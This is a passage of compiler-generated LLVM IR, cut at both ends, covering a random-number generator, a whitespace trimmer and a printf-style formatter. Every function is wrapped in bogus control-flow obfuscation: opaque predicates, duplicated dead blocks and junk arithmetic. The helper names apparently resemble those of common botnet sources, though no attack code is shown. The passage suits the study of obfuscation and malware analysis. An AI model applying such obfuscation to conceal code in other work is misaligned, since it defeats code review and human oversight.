  %25 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %24
  %26 = load i32, i32* %25, align 4
  %27 = load i32, i32* %3, align 4
  %28 = sub nsw i32 %27, 2
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = xor i32 %26, %31
  %33 = xor i32 %32, -1640531527
  %34 = load i32, i32* %3, align 4
  %35 = xor i32 %33, %34
  %36 = load i32, i32* %3, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  store i32 %35, i32* %38, align 4
  %39 = load i32, i32* @x.3
  %40 = load i32, i32* @y.4
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %47

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* @x.3
  %49 = load i32, i32* @y.4
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %47
  %56 = load i32, i32* %3, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %3, align 4
  %58 = load i32, i32* @x.3
  %59 = load i32, i32* @y.4
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart266, label %originalBB57alteredBB

originalBBpart266:                                ; preds = %originalBB57
  br label %10

; <label>:66:                                     ; preds = %10
  %67 = load i32, i32* @x.3
  %68 = load i32, i32* @y.4
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %66
  %75 = load i32, i32* @x.3
  %76 = load i32, i32* @y.4
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %13
  %83 = load i32, i32* %3, align 4
  %_ = sub i32 %83, 3
  %gen = mul i32 %_, 3
  %_1 = sub i32 %83, 3
  %gen2 = mul i32 %_1, 3
  %_3 = shl i32 %83, 3
  %_4 = shl i32 %83, 3
  %_5 = sub i32 %83, 3
  %gen6 = mul i32 %_5, 3
  %_7 = sub i32 0, %83
  %gen8 = add i32 %_7, 3
  %_9 = sub i32 %83, 3
  %gen10 = mul i32 %_9, 3
  %_11 = sub i32 0, %83
  %gen12 = add i32 %_11, 3
  %_13 = sub i32 %83, 3
  %gen14 = mul i32 %_13, 3
  %_15 = sub i32 0, %83
  %gen16 = add i32 %_15, 3
  %84 = sub nsw i32 %83, 3
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %85
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %3, align 4
  %_17 = sub i32 %88, 2
  %gen18 = mul i32 %_17, 2
  %_19 = shl i32 %88, 2
  %_20 = sub i32 0, %88
  %gen21 = add i32 %_20, 2
  %_22 = sub i32 0, %88
  %gen23 = add i32 %_22, 2
  %_24 = sub i32 0, %88
  %gen25 = add i32 %_24, 2
  %89 = sub nsw i32 %88, 2
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %90
  %92 = load i32, i32* %91, align 4
  %_26 = sub i32 %87, %92
  %gen27 = mul i32 %_26, %92
  %_28 = sub i32 0, %87
  %gen29 = add i32 %_28, %92
  %_30 = sub i32 0, %87
  %gen31 = add i32 %_30, %92
  %_32 = sub i32 0, %87
  %gen33 = add i32 %_32, %92
  %93 = xor i32 %87, %92
  %_34 = sub i32 %93, -1640531527
  %gen35 = mul i32 %_34, -1640531527
  %_36 = sub i32 0, %93
  %gen37 = add i32 %_36, -1640531527
  %_38 = sub i32 0, %93
  %gen39 = add i32 %_38, -1640531527
  %_40 = sub i32 %93, -1640531527
  %gen41 = mul i32 %_40, -1640531527
  %_42 = shl i32 %93, -1640531527
  %_43 = shl i32 %93, -1640531527
  %94 = xor i32 %93, -1640531527
  %95 = load i32, i32* %3, align 4
  %_44 = sub i32 %94, %95
  %gen45 = mul i32 %_44, %95
  %_46 = sub i32 0, %94
  %gen47 = add i32 %_46, %95
  %_48 = sub i32 %94, %95
  %gen49 = mul i32 %_48, %95
  %_50 = shl i32 %94, %95
  %_51 = sub i32 %94, %95
  %gen52 = mul i32 %_51, %95
  %_53 = sub i32 %94, %95
  %gen54 = mul i32 %_53, %95
  %_55 = sub i32 %94, %95
  %gen56 = mul i32 %_55, %95
  %96 = xor i32 %94, %95
  %97 = load i32, i32* %3, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %98
  store i32 %96, i32* %99, align 4
  br label %originalBB

originalBB57alteredBB:                            ; preds = %originalBB57, %47
  %100 = load i32, i32* %3, align 4
  %_58 = sub i32 0, %100
  %gen59 = add i32 %_58, 1
  %_60 = sub i32 %100, 1
  %gen61 = mul i32 %_60, 1
  %_62 = shl i32 %100, 1
  %_63 = sub i32 %100, 1
  %gen64 = mul i32 %_63, 1
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %3, align 4
  br label %originalBB57

originalBB68alteredBB:                            ; preds = %originalBB68, %66
  br label %originalBB68
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %54, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %52

; <label>:27:                                     ; preds = %23
  %28 = load i32, i32* @x.7
  %29 = load i32, i32* @y.8
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i8*, i8** %2, align 8
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %36, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = call i32 @isspace(i32 %41) #10
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.7
  %45 = load i32, i32* @y.8
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %52

; <label>:52:                                     ; preds = %originalBBpart2, %23
  %53 = phi i1 [ false, %23 ], [ %43, %originalBBpart2 ]
  br i1 %53, label %54, label %57

; <label>:54:                                     ; preds = %52
  %55 = load i32, i32* %5, align 4
  %56 = add nsw i32 %55, -1
  store i32 %56, i32* %5, align 4
  br label %23

; <label>:57:                                     ; preds = %52
  %58 = load i32, i32* @x.7
  %59 = load i32, i32* @y.8
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %57
  %66 = load i32, i32* %4, align 4
  store i32 %66, i32* %3, align 4
  %67 = load i32, i32* @x.7
  %68 = load i32, i32* @y.8
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %75

; <label>:75:                                     ; preds = %107, %originalBBpart24
  %76 = load i32, i32* %3, align 4
  %77 = load i32, i32* %5, align 4
  %78 = icmp sle i32 %76, %77
  br i1 %78, label %79, label %110

; <label>:79:                                     ; preds = %75
  %80 = load i32, i32* @x.7
  %81 = load i32, i32* @y.8
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %79
  %88 = load i8*, i8** %2, align 8
  %89 = load i32, i32* %3, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = load i8*, i8** %2, align 8
  %94 = load i32, i32* %3, align 4
  %95 = load i32, i32* %4, align 4
  %96 = sub nsw i32 %94, %95
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8, i8* %93, i64 %97
  store i8 %92, i8* %98, align 1
  %99 = load i32, i32* @x.7
  %100 = load i32, i32* @y.8
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart217, label %originalBB6alteredBB

originalBBpart217:                                ; preds = %originalBB6
  br label %107

; <label>:107:                                    ; preds = %originalBBpart217
  %108 = load i32, i32* %3, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %3, align 4
  br label %75

; <label>:110:                                    ; preds = %75
  %111 = load i8*, i8** %2, align 8
  %112 = load i32, i32* %3, align 4
  %113 = load i32, i32* %4, align 4
  %114 = sub nsw i32 %112, %113
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %111, i64 %115
  store i8 0, i8* %116, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %27
  %117 = load i8*, i8** %2, align 8
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8, i8* %117, i64 %119
  %121 = load i8, i8* %120, align 1
  %122 = sext i8 %121 to i32
  %123 = call i32 @isspace(i32 %122) #10
  %124 = icmp ne i32 %123, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %57
  %125 = load i32, i32* %4, align 4
  store i32 %125, i32* %3, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %79
  %126 = load i8*, i8** %2, align 8
  %127 = load i32, i32* %3, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  %130 = load i8, i8* %129, align 1
  %131 = load i8*, i8** %2, align 8
  %132 = load i32, i32* %3, align 4
  %133 = load i32, i32* %4, align 4
  %_ = shl i32 %132, %133
  %_7 = sub i32 %132, %133
  %gen = mul i32 %_7, %133
  %_8 = sub i32 0, %132
  %gen9 = add i32 %_8, %133
  %_10 = sub i32 0, %132
  %gen11 = add i32 %_10, %133
  %_12 = shl i32 %132, %133
  %_13 = shl i32 %132, %133
  %_14 = sub i32 %132, %133
  %gen15 = mul i32 %_14, %133
  %134 = sub nsw i32 %132, %133
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8, i8* %131, i64 %135
  store i8 %130, i8* %136, align 1
  br label %originalBB6
}

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #4

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %originalBBpart2141, %3
  %13 = load i32, i32* @x.11
  %14 = load i32, i32* @y.12
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i8*, i8** %5, align 8
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  %25 = load i32, i32* @x.11
  %26 = load i32, i32* @y.12
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %590

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i32, i32* @x.11
  %35 = load i32, i32* @y.12
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i8*, i8** %5, align 8
  %43 = load i8, i8* %42, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 37
  %46 = load i32, i32* @x.11
  %47 = load i32, i32* @y.12
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %562

; <label>:54:                                     ; preds = %originalBBpart24
  %55 = load i8*, i8** %5, align 8
  %56 = getelementptr inbounds i8, i8* %55, i32 1
  store i8* %56, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %54
  br label %590

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* @x.11
  %64 = load i32, i32* @y.12
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 37
  %75 = load i32, i32* @x.11
  %76 = load i32, i32* @y.12
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %74, label %83, label %84

; <label>:83:                                     ; preds = %originalBBpart28
  br label %563

; <label>:84:                                     ; preds = %originalBBpart28
  %85 = load i8*, i8** %5, align 8
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 45
  br i1 %88, label %89, label %92

; <label>:89:                                     ; preds = %84
  %90 = load i8*, i8** %5, align 8
  %91 = getelementptr inbounds i8, i8* %90, i32 1
  store i8* %91, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %92

; <label>:92:                                     ; preds = %89, %84
  br label %93

; <label>:93:                                     ; preds = %98, %92
  %94 = load i8*, i8** %5, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 48
  br i1 %97, label %98, label %103

; <label>:98:                                     ; preds = %93
  %99 = load i8*, i8** %5, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %5, align 8
  %101 = load i32, i32* %8, align 4
  %102 = or i32 %101, 2
  store i32 %102, i32* %8, align 4
  br label %93

; <label>:103:                                    ; preds = %93
  %104 = load i32, i32* @x.11
  %105 = load i32, i32* @y.12
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %103
  %112 = load i32, i32* @x.11
  %113 = load i32, i32* @y.12
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %120

; <label>:120:                                    ; preds = %173, %originalBBpart212
  %121 = load i8*, i8** %5, align 8
  %122 = load i8, i8* %121, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp sge i32 %123, 48
  br i1 %124, label %125, label %146

; <label>:125:                                    ; preds = %120
  %126 = load i32, i32* @x.11
  %127 = load i32, i32* @y.12
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %125
  %134 = load i8*, i8** %5, align 8
  %135 = load i8, i8* %134, align 1
  %136 = zext i8 %135 to i32
  %137 = icmp sle i32 %136, 57
  %138 = load i32, i32* @x.11
  %139 = load i32, i32* @y.12
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %146

; <label>:146:                                    ; preds = %originalBBpart216, %120
  %147 = phi i1 [ false, %120 ], [ %137, %originalBBpart216 ]
  br i1 %147, label %148, label %176

; <label>:148:                                    ; preds = %146
  %149 = load i32, i32* @x.11
  %150 = load i32, i32* @y.12
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %148
  %157 = load i32, i32* %7, align 4
  %158 = mul nsw i32 %157, 10
  store i32 %158, i32* %7, align 4
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = sub nsw i32 %161, 48
  %163 = load i32, i32* %7, align 4
  %164 = add nsw i32 %163, %162
  store i32 %164, i32* %7, align 4
  %165 = load i32, i32* @x.11
  %166 = load i32, i32* @y.12
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart241, label %originalBB18alteredBB

originalBBpart241:                                ; preds = %originalBB18
  br label %173

; <label>:173:                                    ; preds = %originalBBpart241
  %174 = load i8*, i8** %5, align 8
  %175 = getelementptr inbounds i8, i8* %174, i32 1
  store i8* %175, i8** %5, align 8
  br label %120

; <label>:176:                                    ; preds = %146
  %177 = load i32, i32* @x.11
  %178 = load i32, i32* @y.12
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %176
  %185 = load i8*, i8** %5, align 8
  %186 = load i8, i8* %185, align 1
  %187 = zext i8 %186 to i32
  %188 = icmp eq i32 %187, 115
  %189 = load i32, i32* @x.11
  %190 = load i32, i32* @y.12
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br i1 %188, label %197, label %279

; <label>:197:                                    ; preds = %originalBBpart245
  %198 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %199 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %198, i32 0, i32 0
  %200 = load i32, i32* %199, align 8
  %201 = icmp ule i32 %200, 40
  br i1 %201, label %202, label %224

; <label>:202:                                    ; preds = %197
  %203 = load i32, i32* @x.11
  %204 = load i32, i32* @y.12
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %202
  %211 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %198, i32 0, i32 3
  %212 = load i8*, i8** %211, align 8
  %213 = getelementptr i8, i8* %212, i32 %200
  %214 = bitcast i8* %213 to i32*
  %215 = add i32 %200, 8
  store i32 %215, i32* %199, align 8
  %216 = load i32, i32* @x.11
  %217 = load i32, i32* @y.12
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart257, label %originalBB47alteredBB

originalBBpart257:                                ; preds = %originalBB47
  br label %229

; <label>:224:                                    ; preds = %197
  %225 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %198, i32 0, i32 2
  %226 = load i8*, i8** %225, align 8
  %227 = bitcast i8* %226 to i32*
  %228 = getelementptr i8, i8* %226, i32 8
  store i8* %228, i8** %225, align 8
  br label %229

; <label>:229:                                    ; preds = %224, %originalBBpart257
  %230 = phi i32* [ %214, %originalBBpart257 ], [ %227, %224 ]
  %231 = load i32, i32* @x.11
  %232 = load i32, i32* @y.12
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %229
  %239 = load i32, i32* %230, align 4
  %240 = sext i32 %239 to i64
  %241 = inttoptr i64 %240 to i8*
  store i8* %241, i8** %11, align 8
  %242 = load i8**, i8*** %4, align 8
  %243 = load i8*, i8** %11, align 8
  %244 = icmp ne i8* %243, null
  %245 = load i32, i32* @x.11
  %246 = load i32, i32* @y.12
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %244, label %253, label %271

; <label>:253:                                    ; preds = %originalBBpart261
  %254 = load i32, i32* @x.11
  %255 = load i32, i32* @y.12
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %253
  %262 = load i8*, i8** %11, align 8
  %263 = load i32, i32* @x.11
  %264 = load i32, i32* @y.12
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %272

; <label>:271:                                    ; preds = %originalBBpart261
  br label %272

; <label>:272:                                    ; preds = %271, %originalBBpart265
  %273 = phi i8* [ %262, %originalBBpart265 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.88, i32 0, i32 0), %271 ]
  %274 = load i32, i32* %7, align 4
  %275 = load i32, i32* %8, align 4
